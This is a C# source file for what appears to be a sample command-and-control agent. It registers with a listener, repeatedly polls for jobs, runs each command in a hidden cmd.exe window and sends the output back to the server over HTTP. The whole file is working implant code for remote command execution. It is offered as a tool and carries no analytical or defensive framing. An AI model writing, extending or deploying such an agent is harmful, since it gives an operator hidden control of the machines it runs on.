
using Newtonsoft.Json;
using System.Diagnostics;

namespace c2p0.SampleAgent
{
    public class Program
    {
        static HttpClient client = new HttpClient();

        // Default listener I created on web server
        static string baseAddress = "http://localhost:7869";
        static string agentGuid = Guid.NewGuid().ToString();

        public class Job
        {
            public string id { get; set; }
            public string command { get; set; }
        }

        private static async void Handshake()
        {
            string request = baseAddress + "/?agentGuid=" + agentGuid;
            var response = client.GetStringAsync(request);

            var msg = await response;
        }

        private static async Task<Job> GetJob()
        {
            string request = baseAddress + "/GetJob?agentGuid=" + agentGuid;
            var response = client.GetStringAsync(request);

            var msg = await response;
            return JsonConvert.DeserializeObject<Job>(msg);
        }

        private static async void CompleteJob(string jobGuid, string jobResponse)
        {
            string request = baseAddress + "/CompleteJob?jobGuid=" + jobGuid + "&agentGuid=" + agentGuid + "&response=" + jobResponse;
            var response = client.GetStringAsync(request);

            var msg = await response;
        }

        private static string ExecuteCommand(string command)
        {
            string response = string.Empty;

            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            response = cmd.StandardOutput.ReadToEnd();

            return response;
        }

        static async Task Main(string[] args)
        {
            System.Threading.Thread.Sleep(3000);

            // Handshake
            Handshake();

            while (true)
            {
                try
                {
                    var job = await GetJob();

                    if (job != null)
                    {
                        string response = ExecuteCommand(job.command);

                        CompleteJob(job.id, response);
                    }

                    System.Threading.Thread.Sleep(3000);
                }
                catch
                {
                    //
                }
            }
        }
    }
}